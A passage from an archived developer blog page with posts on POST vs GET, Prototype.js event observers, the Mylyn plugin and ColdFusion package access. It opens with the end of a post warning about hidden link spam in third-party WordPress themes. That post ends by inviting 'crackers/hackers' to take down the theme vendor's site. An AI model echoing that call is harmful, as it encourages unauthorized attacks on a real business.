</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="o">?&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>More information was found from <a href="http://www.onnoot.com/e/532/Templatesbrowser.com_puts_link_spam_in_WordPress">www.onnoot.com/</a>:</p>

<blockquote><p>This produces a link at the bottom of every WordPress page, that is invisible for human readers.</p>

<p>Templatesbrowser.com apparently does this to increase the pagerank of certain websites. Weâ€™re not sure if Google falls for this little link spam trick. But if Google does find out that your page contains link spam, you risk being punished. That could mean that your website is removed from Google&#8217;s search result pages.</p></blockquote>

<p>So for those who don&#8217;t know I hope this was useful, if any people out there are crackers/hackers do me a favour and pull their site down :)</p>

		
		
	</div>


<div class="meta">
	<div class="date">








  


<time datetime="2008-01-24T15:43:02+11:00" pubdate data-updated="true">Jan 24<span>th</span>, 2008</time></div>
	<div class="tags">


	<a class='category' href='/categories/misc/'>Misc</a>, <a class='category' href='/categories/php/'>PHP</a>


</div>
	
		<div class="comments"><a href="/2008/01/24/dont-ever-user-wwwtemplatesbrowsercom-for-wordpress-themes//page/14/index.html#disqus_thread">Comments</a></div>
	
</div></article>


    <article class="post">
	<h2 class="title">
		
		<a href="/2008/01/24/when-to-use-form-post-vs-get/">
		
			When to Use Form POST vs GET?</a>
	</h2>
	<div class="entry-content">
		<p>I read <a href="http://www.coldfusionmuse.com/index.cfm/2008/1/23/web.logs.security">a post</a> today from <a href="http://www.coldfusionmuse.com/">Mark Kruger</a> where he was warning against the possible side effects when using GET as a form submit <em>method</em>.</p>

<p>I think I (unintentionally) offended Mark with my comment where I asked <em>why would anyone EVER use GET?</em> because I pretty much always use POST so was wondering why you would use GET.</p>

<p>In my search for answers I asked <a href="http://www.lynchconsulting.com.au/">Mark Lynch</a> who seems to always have the answer to my questions :)</p>

<p>So in summary (from <a href="http://weblogs.asp.net/mschwarz/archive/2006/12/04/post-vs-get.aspx">Michael Schwarz</a>);</p>

<blockquote><p>POST</p>

<ol>
<li>By default no proxy server or web browser is caching this data, you will always get the real data from you web server.</li>
<li>The length of data you can send to the web server is only restricted by the web server itself, but there is no real restriction.</li>
<li>Character encoding can be done easily using application/x-www-form-urlencoded.</li>
</ol>


<p>GET</p>

<ol>
<li>Running a http request with GET can be cached on your web browser or a configured proxy server.</li>
<li>To get the live data from you web server you have to modify the url that is used in your XHR invoke, simply by using a counter or new Date().getTime() which will generate a unique url.</li>
<li>Maximum URL length is 2,083 characters in Internet Explorer (see MaxClientRequestBuffer: Use POST instead of GET to Send Large Amounts of Data in Request)</li>
<li>In particular, the convention has been established that the GET and HEAD methods SHOULD NOT have the significance of taking an action other than retrieval. [RFC 2616 sec 9]</li>
<li>Character encoding will reduce the amount of data that can be used because of url encoding entities (i.e. three Japanese characters are converted to this: %26%2312454%3B%26%2312455%3B%26%2312502%3B)</li>
</ol>
</blockquote>

<p>There is also a <a href="http://www.cs.tut.fi/~jkorpela/forms/methods.html">great article here</a> if you want some further reading on this subject.</p>

<p>For me (at this stage) this really only has an effect when doing Ajax. If I&#8217;m purely wanting to retrieve data (just HTML for example) from the server then I&#8217;ll use GET, but if I want to do something else with server <em>side effects</em> (such as posting data to be saved to a database) then I&#8217;ll use POST.</p>

<p>Phew&#8230;you learn something new everyday!</p>

		
		
	</div>


<div class="meta">
	<div class="date">








  


<time datetime="2008-01-24T14:01:30+11:00" pubdate data-updated="true">Jan 24<span>th</span>, 2008</time></div>
	<div class="tags">


	<a class='category' href='/categories/x-html/'>(X)HTML</a>


</div>
	
		<div class="comments"><a href="/2008/01/24/when-to-use-form-post-vs-get//page/14/index.html#disqus_thread">Comments</a></div>
	
</div></article>


    <article class="post">
	<h2 class="title">
		
		<a href="/2008/01/23/taking-advantage-of-dom-on-ready-and-event-observers-using-prototypejs/">
		
			Taking Advantage of DOM on Ready and Event Observers Using Prototype.js</a>
	</h2>
	<div class="entry-content">
		<p>I&#8217;ve been doing some JavaScript development with <a href="http://www.prototypejs.org/">Prototype</a> over the last few days and it&#8217;s been interesting trying to do things that I know how to do in <a href="http://www.jquery.com/">jQuery</a>, but in Prototype.</p>

<p>One of the cool things I like with all these JavaScript frameworks is the easy way they allow you to execute code on &#8216;DOM Ready&#8217; (once the page markup has completed but before all the images etc have loaded). I like this as it lets you get a lot of the grunt work and page initialisation out of the way before the user would notice the result of your code, such as hiding page elements etc</p>

<p>Anyway, here is how you can set this up using Prototype. Add this to your &lt;script&gt; tag or hopefully better still in an external .js file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nb">document</span><span class="p">.</span><span class="nx">observe</span><span class="p">(</span><span class="s1">&#39;dom:loaded&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(){</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">//any code here will be read once the DOM is ready, nice and early!</span>
</span><span class='line'>
</span><span class='line'><span class="p">});</span>
</span></code></pre></td></tr></table></div></figure>


<p>Another way to do this is using the Event model to call a separate function to handle your initialisation code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">Event</span><span class="p">.</span><span class="nx">observe</span><span class="p">(</span><span class="nb">document</span><span class="p">,</span> <span class="s1">&#39;dom:loaded&#39;</span><span class="p">,</span> <span class="nx">init</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="kd">function</span> <span class="nx">init</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="c1">//initialise code</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now another cool thing about these frameworks is they give you the ability to register &#8220;listeners&#8221; for user events. This way I can have my HTML markup completely free of <em>event code</em> like &#8220;onclick&#8221; or &#8220;onsubmit&#8221; etc which is great for users with JavaScript turned off as it clearly degrades nice and cleanly, but I can setup listeners in my external .js files to handle these events.</p>

<p>So to handle a form submission I might have the following HTML form:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="o">&lt;</span><span class="nx">form</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;frmAddLink&quot;</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&quot;frmAddLink&quot;</span> <span class="nx">method</span><span class="o">=</span><span class="s2">&quot;post&quot;</span> <span class="nx">action</span><span class="o">=</span><span class="s2">&quot;/?event=links/create&quot;</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'>  <span class="c">&lt;!--</span> <span class="nx">form</span> <span class="nx">controls</span> <span class="nx">here</span> <span class="o">--&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="err">/form&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>And my JavaScript will be:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nb">document</span><span class="p">.</span><span class="nx">observe</span><span class="p">(</span><span class="s1">&#39;dom:loaded&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(){</span>
</span><span class='line'>  
</span><span class='line'>  <span class="nx">Event</span><span class="p">.</span><span class="nx">observe</span><span class="p">(</span><span class="s1">&#39;frmAddLink&#39;</span><span class="p">,</span> <span class="s1">&#39;submit&#39;</span><span class="p">,</span> <span class="nx">submitForm</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="p">});</span>
</span></code></pre></td></tr></table></div></figure>


<p>This basically says whenever the form with an ID of &#8220;frmAddLink&#8221; is submitted&#8230;execute the function called &#8220;submitForm&#8221; (which can of course be any function you like).</p>

<p>An &#8220;event&#8221; container is automatically made available to the &#8220;submitForm&#8221; as an argument where I can serialize my form data, setup form &#8220;action&#8221; URL&#8217;s etc and submit asynchronously. Again, no JavaScript in your markup is good and degrades easily :)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">function</span> <span class="nx">submitForm</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>
</span><span class='line'>  <span class="nx">Event</span><span class="p">.</span><span class="nx">stop</span><span class="p">(</span><span class="nx">event</span><span class="p">);</span> <span class="c1">//Stops the eventâ€™s propagation and prevents its default action from being triggered eventually.</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">element</span> <span class="o">=</span> <span class="nx">event</span><span class="p">.</span><span class="nx">element</span><span class="p">();</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">sAction</span> <span class="o">=</span> <span class="nx">element</span><span class="p">.</span><span class="nx">action</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">stForm</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="nx">element</span><span class="p">.</span><span class="nx">id</span><span class="p">).</span><span class="nx">serialize</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>   <span class="c1">//serialise the form for posting</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">new</span> <span class="nx">Ajax</span><span class="p">.</span><span class="nx">Request</span><span class="p">(</span><span class="nx">sAction</span><span class="p">,{</span>
</span><span class='line'>      <span class="nx">parameters</span><span class="o">:</span> <span class="nx">stForm</span><span class="p">,</span>
</span><span class='line'>      <span class="nx">method</span><span class="o">:</span><span class="s1">&#39;get&#39;</span><span class="p">,</span>
</span><span class='line'>          <span class="nx">onSuccess</span><span class="o">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">transport</span><span class="p">){</span>
</span><span class='line'>          <span class="kd">var</span> <span class="nx">response</span> <span class="o">=</span> <span class="nx">transport</span><span class="p">.</span><span class="nx">responseText</span> <span class="o">||</span> <span class="s2">&quot;no response text&quot;</span><span class="p">;</span>
</span><span class='line'>          <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;myEl&#39;</span><span class="p">).</span><span class="nx">update</span><span class="p">(</span><span class="nx">response</span><span class="p">);</span>
</span><span class='line'>      <span class="p">},</span>
</span><span class='line'>      <span class="nx">onFailure</span><span class="o">:</span> <span class="kd">function</span><span class="p">(){</span> <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;Something went wrong...&#39;</span><span class="p">)</span> <span class="p">}</span>
</span><span class='line'>  <span class="p">});</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>One problem though is if you load a page on your site where the form in question doesn&#8217;t exist, you will get an error where your Observer is being registered because it can&#8217;t find the element in the DOM and Prototype isn&#8217;t a &#8220;fail silently&#8221; framework.</p>

<p>To get around this I do the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nb">document</span><span class="p">.</span><span class="nx">observe</span><span class="p">(</span><span class="s1">&#39;dom:loaded&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(){</span>
</span><span class='line'>  
</span><span class='line'>  <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;frmAddLink&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="kc">null</span> <span class="o">?</span> <span class="s2">&quot;&quot;</span> <span class="o">:</span> <span class="nx">Event</span><span class="p">.</span><span class="nx">observe</span><span class="p">(</span><span class="s1">&#39;frmAddLink&#39;</span><span class="p">,</span> <span class="s1">&#39;submit&#39;</span><span class="p">,</span> <span class="nx">submitForm</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="p">});</span>
</span></code></pre></td></tr></table></div></figure>


<p>This simply says if the element &#8220;frmAddLink&#8221; exists register an observer; else do nothing.</p>

<h3>UPDATE 24th Jan</h3>

<p>After asking a question on the Prototype mailing list, the following is &#8220;best practise&#8221; when looking for elements which might not be on every page:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">var</span> <span class="nx">el</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;frmAddLink&#39;</span><span class="p">);</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nx">el</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>      
</span><span class='line'>  <span class="nx">el</span><span class="p">.</span><span class="nx">observe</span><span class="p">(</span><span class="s1">&#39;submit&#39;</span><span class="p">,</span> <span class="nx">showElement</span><span class="p">);</span>
</span><span class='line'>  <span class="c1">//etc</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The first line will have a value of NULL if the element &#8220;frmAddLink&#8221; isn&#8217;t defined in the markup. This is also a better way as you can have multiple statements instead of just one observe, handy if you want to do more things on &#8216;submit&#8217;.</p>

<h3>UPDATE 2nd Feb</h3>

<p>Thanks to Dr J in the comments of this post where he advised that I actually was using the wrong syntax for dom:loaded. I had the equivalent of window.onLoad() by using the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">Event</span><span class="p">.</span><span class="nx">observe</span><span class="p">(</span><span class="nb">window</span><span class="p">,</span> <span class="s1">&#39;load&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>
</span><span class='line'><span class="p">});</span>
</span></code></pre></td></tr></table></div></figure>


<p>This of course not the best as you need to wait for the entire page to load before your JavaScripts are run. The updated way (dom:loaded) is much nicer :)</p>

		
		
	</div>


<div class="meta">
	<div class="date">








  


<time datetime="2008-01-23T21:44:59+11:00" pubdate data-updated="true">Jan 23<span>rd</span>, 2008</time></div>
	<div class="tags">


	<a class='category' href='/categories/javascript/'>Javascript</a>


</div>
	
		<div class="comments"><a href="/2008/01/23/taking-advantage-of-dom-on-ready-and-event-observers-using-prototypejs//page/14/index.html#disqus_thread">Comments</a></div>
	
</div></article>


    <article class="post">
	<h2 class="title">
		
		<a href="/2007/12/18/mylyn-plugin-for-aptana/">
		
			Mylyn Plugin for Aptana</a>
	</h2>
	<div class="entry-content">
		<p>I&#8217;ve been reading about <a href="http://www.eclipse.org/mylyn/">Mylyn</a> for a little while now but haven&#8217;t had the opportunity to install it. After reading <a href="http://adamflater.blogspot.com/2007/12/review-of-mylyn.html">this post</a> today from Adam Flater I thought it was about time I gave it a go.</p>

<p>For those that don&#8217;t know Mylyn:</p>

<blockquote><p>Mylyn is the Task-Focused UI for Eclipse that reduces information overload and makes multi-tasking easy. It does this by making tasks a first class part of Eclipse, and integrating rich and offline editing for repositories such as Bugzilla, Trac, and JIRA</p></blockquote>

<p>Currently the <a href="http://www.eclipse.org/mylyn/downloads/">downloads</a> on the site only seem to be for Eclipse 3.3/3.4 but as I&#8217;m using <a href="http://www.aptana.com/">Aptana</a> (which bundles with Eclipse 3.2) I needed to use an earlier version of Mylyn.</p>

<p>I ended up finding the following URL and doing a &#8216;Software Update&#8217; (help -> Software Updates -> Find and install -> Search for new features to install) in Eclipse:</p>

<p>http://download.eclipse.org/tools/mylyn/update/e3.2</p>

<p>There are 2 .jar which I needed to already have to successfully install the full Mylyn package (according to my Aptana), but as I don&#8217;t develop in Java I could remove them from the installation by unchecking the checkboxes on the &#8220;Software Updates&#8221; page.</p>

<ul>
<li><p>org.eclipse.jdt</p></li>
<li><p>org.eclipse.pde.ui</p></li>
</ul>


<p>If you don&#8217;t uncheck these then you won&#8217;t be able to install.</p>

<p>After that just restart Aptana and you&#8217;re done :)</p>

<p>For some reason the perspective is called &#8220;Planning&#8221; and not &#8220;Mylyn&#8221;, in case you can&#8217;t find it!</p>

<p>There are some cool tutorials floating around for Mylyn including <a href="http://www.ibm.com/developerworks/java/library/j-mylyn1/?ca=dgr-eclipse-1">this one</a>.</p>

		
		
	</div>


<div class="meta">
	<div class="date">








  


<time datetime="2007-12-18T15:27:08+11:00" pubdate data-updated="true">Dec 18<span>th</span>, 2007</time></div>
	<div class="tags">


	<a class='category' href='/categories/misc/'>Misc</a>


</div>
	
		<div class="comments"><a href="/2007/12/18/mylyn-plugin-for-aptana//page/14/index.html#disqus_thread">Comments</a></div>
	
</div></article>


    <article class="post">
	<h2 class="title">
		
		<a href="/2007/12/08/enforcing-your-service-as-an-api/">
		
			Enforcing Your Service as an API</a>
	</h2>
	<div class="entry-content">
		<p>A lot ColdFusion developers are moving (or already there) towards a more OOP style of development. They have an understanding of and use several techniques and design patterns when building applications, particularly when it relates to things such as MVC and n-tiered development.</p>

<p>A small part of this is grouping related files withing separate directories in you application. Take &#8216;User&#8217; related files as an example where you&#8217;ll probably need some kind of a business object (User.cfc), something to store business/application logic (service or manager) and typically some files to handle database access.</p>

<p>With that in mind most will recognise the following CFC types (as they pertain at least to the ColdFusion community):</p>

<ul>
<li><p>Bean</p></li>
<li><p>Service (or manager)</p></li>
<li><p>Gateway</p></li>
<li><p>DAO</p></li>
</ul>


<p>This is not to get into whether you should use 5:1 components for every different &#8216;thing&#8217; in your application (the 5th might be a controller), or whether you should have a &#8216;Gateway&#8217; AND a &#8216;DAO&#8217; for data access. Instead I&#8217;m talking about how you might layout your files and control access to the methods contained within them.</p>

<p>A typical structure people use is the reverse domain naming (which can prevent naming conflicts with other similarly named files), so for me I might have the following:</p>

<p>/com/chapter31/myApp/user</p>

<p>The &#8216;user&#8217; directory could hold the following cfc&#8217;s:</p>

<ul>
<li><p>User.cfc</p></li>
<li><p>UserService.cfc</p></li>
<li><p>UserGateway.cfc</p></li>
<li><p>UserDAO.cfc</p></li>
</ul>


<p>How do I manage access to methods contained within the Gateway or DAO? Often you may not want developers being able to access the getUsers() method inside UserGateway.cfc directly. This might be for different reasons, typically there may be some business logic required or a bean which is to be returned instead of a query etc. Either way, developers shouldn&#8217;t access these data access files directly.</p>

<p>A nice easy way to get around this is to make all &#8216;public&#8217; methods inside the components you want to restrict access to, &#8216;package&#8217;, which means that they are only accessible from files which reside within the same directory (/user).</p>

<p>An example method within UserGateway.cfc might look like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="o">&lt;</span><span class="nx">cffunction</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;getUsers&quot;</span> <span class="nx">output</span><span class="o">=</span><span class="s2">&quot;false&quot;</span> <span class="nx">access</span><span class="o">=</span><span class="s2">&quot;package&quot;</span> <span class="nx">returntype</span><span class="o">=</span><span class="s2">&quot;query&quot;</span><span class="o">&gt;</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c1">//query the users table in your database below</span>
</span><span class='line'>  
</span><span class='line'><span class="o">&lt;</span><span class="err">/cffunction&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>If you tried to access this method from outside the &#8216;user&#8217; directory (say index.cfm within the webroot) you will get an error saying something like</p>

<p><em>&#8220;The package method &#8216;getUsers&#8217; in component /user/UserGateway.cfc cannot be accessed from /index.cfm.&#8221;</em></p>

<p>This is because index.cfm does not reside within the &#8216;user&#8217; directory and because the method&#8217;s access modifier is set to &#8216;package&#8217;, access is restricted.</p>

<p>So how do we now get access to this method?</p>

<p>A common approach is to have your Service act as an API to the other cfc&#8217;s within the &#8216;user&#8217; directory by setting the access modifier to &#8216;public&#8217; inside your UserService.cfc. Now whenever you need to call Gateway or DAO methods, you need to go through UserService.cfc which will hold your business logic and application rules etc.</p>

<p>This is a nice way to store related files and control access to them to ensure your application rules are kept intact.</p>

		
		
	</div>


<div class="meta">
	<div class="date">








  


<time datetime="2007-12-08T17:36:35+11:00" pubdate data-updated="true">Dec 8<span>th</span>, 2007</time></div>
	<div class="tags">


	<a class='category' href='/categories/coldfusion/'>ColdFusion</a>


</div>
	
		<div class="comments"><a href="/2007/12/08/enforcing-your-service-as-an-api//page/14/index.html#disqus_thread">Comments</a></div>
	
</div></article>

<nav id="pagenavi">
    
        <a href="/page/13/" class="prev">Prev</a>
    
    
        <a href="/page/15/" class="next">Next</a>
    
    <div class="center"><a href="/blog/archives">Blog Archives</a></div>
</nav></div>
	<footer id="footer" class="inner">Copyright &copy; 2013

    Michael Sharman

</footer>
	<script src="/javascripts/slash.js"></script>
<script src="/javascripts/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
	$('.fancybox').fancybox();
})(jQuery);
</script> <!-- Delete or comment this line to disable Fancybox -->


<script type="text/javascript">
      var disqus_shortname = 'chapter31';
      
        
        var disqus_script = 'count.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>



	<script type="text/javascript">
		var _gaq = _gaq || [];
		_gaq.push(['_setAccount', 'UA-306772-2']);
		_gaq.push(['_trackPageview']);

		(function() {
			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
		})();
	</script>



</body>
</html>
